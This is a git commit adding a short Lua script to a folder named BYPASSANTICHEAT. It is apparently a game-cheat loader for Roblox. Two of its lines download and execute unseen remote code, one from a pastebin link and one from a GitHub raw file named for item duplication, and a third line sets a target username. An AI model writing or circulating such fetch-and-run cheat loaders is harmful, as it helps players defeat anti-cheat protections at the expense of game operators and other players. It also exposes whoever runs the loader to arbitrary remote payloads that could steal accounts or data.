02d12099f013f509b28929e09cfa7aa9695898f2
RENBex6969 <109706035+RENBex6969@users.noreply.github.com>
2023-01-03 13:25:25 +0800

    Create .lua

---
+++ InfiniteHub/BYPASSANTICHEAT/.lua
@@ -0,0 +1,5 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
+
+
+_G.Username = "ML_DrakenChou"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Centai/main/Duplication.string"))()
